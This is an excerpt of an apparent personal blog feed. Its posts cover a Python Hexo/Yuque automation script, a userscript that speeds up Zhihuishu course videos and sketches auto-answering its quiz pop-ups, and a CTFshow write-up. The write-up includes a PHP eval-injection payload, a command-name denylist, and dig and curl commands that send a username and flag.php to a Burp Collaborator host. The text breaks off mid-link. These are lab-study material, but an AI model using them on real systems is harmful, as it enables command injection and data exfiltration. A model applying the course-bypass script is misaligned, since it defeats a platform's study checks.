        <content type="html"><![CDATA[<p>用了语雀的md编辑器，感觉typora有点用不惯，但是语雀的到处图片会有限制，虽然能够浏览，但是使用hexo之后就不行了，寻找了几个方法，最好用的就是修改图片格式，将地址后的参数删除掉。<br>一个一个改太费劲了，因此写了一个简单的python脚本来代替机械劳动。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   YuQueShareLink.py</span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog :   natro92.github.io</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/5/16 21:04   natro92      1.0         将语雀链接在导出到博客时可以正常使用</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replace_string_in_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        content = file.read()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 使用正则表达式匹配所有符合条件的字符串，并进行替换操作</span></span><br><span class="line">    replaced_content = re.sub(<span class="string">r&quot;.png)&quot;</span>, <span class="string">&quot;.png)&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(replaced_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请提供需要处理的文件路径, 且文件需要和该py脚本处在同一文件夹下，比如：我的博客.md&quot;</span>)</span><br><span class="line">    file_path = <span class="built_in">input</span>(<span class="string">&quot;路径：&quot;</span>)</span><br><span class="line">    is_end_of_md = re.search(<span class="string">r&quot;\.md&quot;</span>, file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_end_of_md:</span><br><span class="line">        file_path += <span class="string">&quot;.md&quot;</span></span><br><span class="line">    replace_string_in_file(file_path)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>改完这个了，想要同步到hexo，需要有一步<code>hexo new 文章名称</code>，这样会生成一个文件头，一般我会把这个修改后的文章内容复制到那个新生成的文件，并且修改tag、category等参数。<br>那么能不能直接把这些东西都合并到一起呢？<br>通过万能的互联网，添加一点代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_headers_in_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    file_name = os.path.basename(file_path)</span><br><span class="line">    replaced_content = re.sub(<span class="string">r&quot;.md&quot;</span>, <span class="string">&quot;&quot;</span>, file_name)</span><br><span class="line">    time_str = datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r+&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        contents = f.read()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;当前tags:&#x27;</span>, [<span class="string">&#x27;WriteUp&#x27;</span>, <span class="string">&#x27;CTFshow0-1&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;当前categories:&#x27;</span>, [<span class="string">&#x27;CTF&#x27;</span>])</span><br><span class="line">        new_tags = <span class="built_in">input</span>(<span class="string">&#x27;你想要修改tags吗？ (y/n) 默认n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> new_tags.lower() == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            tags_str = <span class="built_in">input</span>(<span class="string">&#x27;输入你的tags，注意用英文逗号分隔: &#x27;</span>)</span><br><span class="line">            tags = [tag.strip() <span class="keyword">for</span> tag <span class="keyword">in</span> tags_str.split(<span class="string">&#x27;,&#x27;</span>)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tags = [<span class="string">&#x27;WriteUp&#x27;</span>, <span class="string">&#x27;CTFshow0-1&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        new_categories = <span class="built_in">input</span>(<span class="string">&#x27;你想要修改tags吗？(y/n) 默认n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> new_categories.lower() == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            categories_str = <span class="built_in">input</span>(<span class="string">&#x27;输入你的categories，注意用英文逗号分隔: &#x27;</span>)</span><br><span class="line">            categories = [category.strip() <span class="keyword">for</span> category <span class="keyword">in</span> categories_str.split(<span class="string">&#x27;,&#x27;</span>)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            categories = [<span class="string">&#x27;CTF&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        new_contents = <span class="string">&#x27;---\n&#x27;</span> \</span><br><span class="line">                       <span class="string">&#x27;title: &#x27;</span> + file_name + <span class="string">&#x27;\n&#x27;</span> \</span><br><span class="line">                                               <span class="string">&#x27;date: &#x27;</span> + time_str + <span class="string">&#x27;\n&#x27;</span> \</span><br><span class="line">                                                                     <span class="string">&#x27;tags:\n&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> tag <span class="keyword">in</span> tags:</span><br><span class="line">            new_contents += <span class="string">&#x27;  - &#x27;</span> + tag + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        new_contents += <span class="string">&#x27;categories:\n&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> category <span class="keyword">in</span> categories:</span><br><span class="line">            new_contents += <span class="string">&#x27;  - &#x27;</span> + category + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        new_contents += <span class="string">&#x27;---\n&#x27;</span> \</span><br><span class="line">                        + contents</span><br><span class="line"></span><br><span class="line">        f.seek(<span class="number">0</span>)</span><br><span class="line">        f.write(new_contents)</span><br></pre></td></tr></table></figure><p>这个功能完成了，下面就是一键上传和更新到私有仓库了。<br>其实这里是可以使用hexo自带的库（hexo-uploader）但是为了简化、简单代码，这里就调用powershell来实现hexo的生成的发布。并且远程git给私有仓库。<br>其实hexo自带备份功能，但是似乎会和文件存到一起。因此我还是选择了单独创一个仓库保存的方法。<br>调用cmd来跑命令，因为之前git的信息和hexo的配置已经配置过了，因此直接使用就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hexo_generate_and_deploy</span>():</span><br><span class="line">    <span class="comment"># cmd命令 cd后修改为你自己的blog文件夹位置</span></span><br><span class="line">    <span class="comment"># 字符串前面加r防止解析，或者将单斜杠转换为双斜杠</span></span><br><span class="line">    cmd = <span class="string">r&#x27;cd C:\Users\natro92\Desktop\blog &amp;&amp; hexo g &amp;&amp; hexo d&#x27;</span></span><br><span class="line">    p = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE)</span><br><span class="line">    <span class="built_in">print</span>(p.stdout.read().decode())</span><br><span class="line">    a = <span class="built_in">input</span>(<span class="string">&#x27;按任意键继续&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">git_backup</span>():</span><br><span class="line">    <span class="comment"># 实现备份git功能</span></span><br><span class="line">    <span class="comment"># 切换到本地的git仓库目录</span></span><br><span class="line">    repo_dir = <span class="string">r&#x27;C:\Users\natro92\Desktop\blog&#x27;</span></span><br><span class="line">    <span class="comment"># python3.6特性，格式化文本</span></span><br><span class="line">    cmd_cd = <span class="string">f&#x27;cd <span class="subst">&#123;repo_dir&#125;</span> &amp;&amp; &#x27;</span></span><br><span class="line">    cmd_add = <span class="string">&#x27;git add .&#x27;</span></span><br><span class="line">    commit_msg = <span class="string">&#x27;%date:~0,4%%date:~5,2%%date:~8,2%&#x27;</span></span><br><span class="line">    cmd_commit = <span class="string">f&#x27;git commit -m &quot;<span class="subst">&#123;commit_msg&#125;</span>&quot;&#x27;</span></span><br><span class="line">    cmd_push = <span class="string">&#x27;git push&#x27;</span></span><br><span class="line">    cmd = cmd_cd + cmd_add + <span class="string">&#x27; &amp;&amp; &#x27;</span> + cmd_commit + <span class="string">&#x27; &amp;&amp; &#x27;</span> + cmd_push</span><br><span class="line">    result = subprocess.run(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE)</span><br><span class="line">    <span class="built_in">print</span>(result.stdout.decode())</span><br></pre></td></tr></table></figure><p>就是简单的造轮子，但是能够让自己造轮子的效率更高。<br>附上完整版链接：<a href="https://github.com/natro92/YuQueShareLink">https://github.com/natro92/YuQueShareLink</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
            <tag> Shortcut </tag>
            
            <tag> 语雀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始的智慧树倍速油猴脚本（一）</title>
      <link href="/2023/07/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E6%99%BA%E6%85%A7%E6%A0%91%E5%80%8D%E9%80%9F%E6%B2%B9%E7%8C%B4%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/07/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E6%99%BA%E6%85%A7%E6%A0%91%E5%80%8D%E9%80%9F%E6%B2%B9%E7%8C%B4%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：BYD智慧树嘎嘎刷视频，1.5倍速太浪费时间了，通过查看前端代码发现了一种逃课方法。可以通过修改播放器的倍速播放功能来实现加速播放效果。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         智慧树16倍速自动脚本</span></span><br><span class="line"><span class="comment">// @namespace    http://natro92.github.io</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  自动修改脚本倍速x1.5-&gt;x16</span></span><br><span class="line"><span class="comment">// @author       natro92</span></span><br><span class="line"><span class="comment">// @match        *://*.zhihuishu.com/*</span></span><br><span class="line"><span class="comment">// @icon         https://www.google.com/s2/favicons?sz=64&amp;domain=zhihuishu.com</span></span><br><span class="line"><span class="comment">// @grant        GM_log</span></span><br><span class="line"><span class="comment">// @require      https://code.jquery.com/jquery-2.1.4.min.js</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">changeSpeed</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title function_">GM_log</span>(<span class="string">&quot;change speeed begins!&quot;</span>);</span><br><span class="line">  <span class="comment">//0 - 1.0 | 1 - 1.25 | 2 - 1.5</span></span><br><span class="line">  <span class="keyword">var</span> speed2 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#vjs_container &gt; div.controlsBar &gt; div.speedBox &gt; div &gt; div.speedTab.speedTab15&quot;</span>);</span><br><span class="line">  speed2.<span class="title function_">setAttribute</span>(<span class="string">&quot;rate&quot;</span>,<span class="string">&quot;16.0&quot;</span>);</span><br><span class="line">  speed2.<span class="property">innerHTML</span> = <span class="string">&quot;X 16.0&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> speed1 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#vjs_container &gt; div.controlsBar &gt; div.speedBox &gt; div &gt; div.speedTab.speedTab10&quot;</span>);</span><br><span class="line">  speed1.<span class="title function_">setAttribute</span>(<span class="string">&quot;rate&quot;</span>,<span class="string">&quot;8.0&quot;</span>);</span><br><span class="line">  speed1.<span class="property">innerHTML</span> = <span class="string">&quot;X 8.0&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> speed0 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#vjs_container &gt; div.controlsBar &gt; div.speedBox &gt; div &gt; div.speedTab.speedTab05&quot;</span>);</span><br><span class="line">  speed0.<span class="title function_">setAttribute</span>(<span class="string">&quot;rate&quot;</span>,<span class="string">&quot;4.0&quot;</span>);</span><br><span class="line">  speed0.<span class="property">innerHTML</span> = <span class="string">&quot;X 4.0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="comment">//修改播放器的倍速值</span></span><br><span class="line">  <span class="title function_">GM_log</span>(<span class="string">&quot;Hello World！&quot;</span>);</span><br><span class="line">  <span class="comment">// 修改value属性</span></span><br><span class="line">  <span class="comment">// var speed = document.getElementsByClassName(&#x27;speedTab15&#x27;)[0];</span></span><br><span class="line">  <span class="comment">// console.log(speed.innerHTML);</span></span><br><span class="line">  <span class="comment">// speed.setAttribute(&#x27;rate&#x27;,&#x27;16.0&#x27;);</span></span><br><span class="line">  <span class="comment">// speed.innerHTML = &quot;X 16.0&quot;;</span></span><br><span class="line">  <span class="comment">// setTimeout(function()&#123;</span></span><br><span class="line">  <span class="comment">//     changeSpeed();</span></span><br><span class="line">  <span class="comment">// &#125;, 5000);</span></span><br><span class="line">  <span class="comment">// byd傻逼智慧树一秒渲染完成不了，延迟五秒加载、</span></span><br><span class="line">  <span class="comment">// 等待页面渲染成功之后修改</span></span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">changeSpeed</span>();</span><br><span class="line">    <span class="comment">//模拟点击，自动修改倍速</span></span><br><span class="line">    <span class="comment">//这个不行，会检测到脚本问题</span></span><br><span class="line">    <span class="comment">// var e = document.createEvent(&quot;MouseEvents&quot;);</span></span><br><span class="line">    <span class="comment">// e.initEvent(&quot;click&quot;, true, true);</span></span><br><span class="line">    <span class="comment">// document.querySelector(&quot;#vjs_container &gt; div.controlsBar &gt; div.speedBox &gt; div &gt; div.speedTab.speedTab05&quot;).dispatchEvent(e);</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="title function_">GM_log</span>(<span class="string">&quot;Finished yet！&quot;</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>但是这样只做到了修改默认页面的倍速栏，但是想要修改其他的页面的却做不到。</p><p>除此之外，智慧树有脚本检测，因此模拟点击无法使用了。<br>经过抓包发现，修改倍速写在了前端中，暂停时会有时长保存，可以尝试其他方式来达到修改。<br>基础功能已经实现了，下一步就是播放检测。<br>当暂停状态下id（路径：<code>document.querySelector(&quot;#playButton&quot;)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684912224706-9e4ffb01-c67b-4d25-aff7-479a2237a766.png" alt="image.png"><br>播放时：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684912271465-fafa5847-3a00-4b59-b21f-53901e2b6346.png" alt="image.png"><br>检测播放写完了，下面就是勾吧弹窗的问题了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684913986235-680c6439-096a-4bda-abe9-f340b71de737.png" alt="image.png"><br>位置：<code>document.querySelector(&quot;#playTopic-dialog &gt; div&quot;)</code><br>我们要点击其中的选择按钮，再提交。才行<br>想法有两个<br>第一个是选择错误之后选择一个一个尝试直到弹框消失，第二个是选择错误之后检测正确答案，提交正确答案。<br>返回正常页面时发现，弹框不是隐藏的，而是有题目新创建一个。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684916243149-df686aec-b7f0-444d-8f8f-628c6b8e22f2.png" alt="image.png"><br>搞了下别人的账号，用了一下发现答案在没答的时候不会分发，html处是注释。<br>直接提交正确答案：<br><code>document.querySelector(&quot;#playTopic-dialog &gt; div &gt; div.el-dialog__body &gt; div &gt; div.el-scrollbar__wrap &gt; div &gt; div &gt; div.radio &gt; div &gt; p &gt; span&quot;)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684916770084-1ff9abd9-728a-4952-bf9d-bbdd0c631d73.png" alt="image.png"><br>有个选中和未选中<br><code>document.querySelector(&quot;#playTopic-dialog &gt; div &gt; div.el-dialog__body &gt; div &gt; div.el-scrollbar__wrap &gt; div &gt; div &gt; div.radio &gt; ul &gt; li:nth-child(1) &gt; div:nth-child(1) &gt; svg &gt; use&quot;)</code><br>中的href值从<code>#iconxuan</code>转变为<code>#iconxuanzhong</code><br>并且点击关闭按钮继续。<br><code>document.querySelector(&quot;#playTopic-dialog &gt; div &gt; div.el-dialog__footer &gt; span &gt; div&quot;)</code><br><code>document.querySelector(&quot;#playTopic-dialog &gt; div &gt; div.el-dialog__header &gt; button &gt; i&quot;)</code></p><p><code>#playTopic-dialog &gt; div &gt; div.el-dialog__footer &gt; span &gt; div</code><br>勾吧弹窗推出没调好，还得调。<br>先搁置了，等过段时间，出新的刷课视频的时候接着搞。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
            <tag> Tampermonkey </tag>
            
            <tag> Shortcut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web132-web150plus-php特性篇（三）</title>
      <link href="/2023/07/09/web132-web150plus-php%E7%89%B9%E6%80%A7%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2023/07/09/web132-web150plus-php%E7%89%B9%E6%80%A7%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h1><h3 id="考点：-amp-amp-和-优先级问题"><a href="#考点：-amp-amp-和-优先级问题" class="headerlink" title="考点：&amp;&amp;和||优先级问题"></a>考点：&amp;&amp;和||优先级问题</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688282044922-9aae79c5-54f5-49dd-9b3c-342702babe1f.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>||</code>的优先级高于<code>&amp;&amp;</code><br>因此只需要判断<code>$username ===&quot;admin&quot;</code>成立了即可，同时<code>code==admin</code><br>因此payload：<code>?username=admin&amp;password=&amp;code=admin</code></p><h1 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h1><h3 id="考点：substr-F-0-6-变量覆盖-curl外带-burp-Collaborator-Client"><a href="#考点：substr-F-0-6-变量覆盖-curl外带-burp-Collaborator-Client" class="headerlink" title="考点：substr($F,0,6)变量覆盖 curl外带 burp Collaborator Client"></a>考点：substr($F,0,6)变量覆盖 curl外带 burp Collaborator Client</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了一下wp，发现做法太神奇了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">get传参</span><br><span class="line">F=`$F `;sleep(3)</span><br><span class="line"></span><br><span class="line">substr($F,0,6)截断得前六个字符&#x27;$F &#x27;;</span><br><span class="line"></span><br><span class="line">eval(substr($F,0,6));</span><br><span class="line">==&gt;</span><br><span class="line">eval(`$F `;);</span><br><span class="line">==&gt;</span><br><span class="line">eval(``$F `;sleep(3) `;);</span><br><span class="line">``是shell_exec()函数的缩写</span><br><span class="line">所以执行了$F &#x27;;sleep(3)</span><br></pre></td></tr></table></figure><p>然后就是使用反弹shell或者curl外带：</p><h2 id="curl外带："><a href="#curl外带：" class="headerlink" title="curl外带："></a>curl外带：</h2><blockquote><p><a href="https://blog.csdn.net/qq_46918279/article/details/121061134">https://blog.csdn.net/qq_46918279/article/details/121061134</a> curl外带<br><a href="https://blog.csdn.net/he_and/article/details/108355229">https://blog.csdn.net/he_and/article/details/108355229</a> curl外带<br><a href="https://zhuanlan.zhihu.com/p/473336511">https://zhuanlan.zhihu.com/p/473336511</a> Collaborator Client模块</p></blockquote><p>经过学习发现，可以配合bp的Collaborator Client模块使用<br>使用方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688284688101-f82a6e1c-42f6-4aaf-8f8b-afd50d35db5a.png" alt="image.png"><br>按照以下栏目，点击Burp Collaborator Server下的 Run health check检测是否能够连接服务器。（注意这步需要梯子）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688284784490-e863ad05-372e-42c4-a343-5e390ef3ae9a.png" alt="image.png"><br>复制域名<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688284936567-a39cd308-e669-4a81-ab34-f7b6ccb866ce.png" alt="image.png"><br>使用虚拟机 dig指令查询域名：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688284966429-41df760c-df8c-42e6-a5c6-0bb0d92d54cb.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig `whoami`.ukin3lx28kyesms5nszlr2p7tyzond.burpcollaborator.net</span><br></pre></td></tr></table></figure><p>然后返回查看client返回的日志：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688285035508-fe1d28db-8507-4d6f-92b7-c07b9d628113.png" alt="image.png"><br>这样就是测试成功了<br>payload可以如下使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F`;+curl -X POST -F xx=@flag.php  http://ukin3lx28kyesms5nszlr2p7tyzond.burpcollaborator.net</span><br></pre></td></tr></table></figure><p>然后就可以得到我们需要的flag内容了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688285190818-75b5e0d3-cc3a-451a-90b1-c022f5a0c887.png" alt="image.png"></p><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><blockquote><p><a href="https://blog.csdn.net/anquanniu/article/details/102641702">https://blog.csdn.net/anquanniu/article/details/102641702</a><br><a 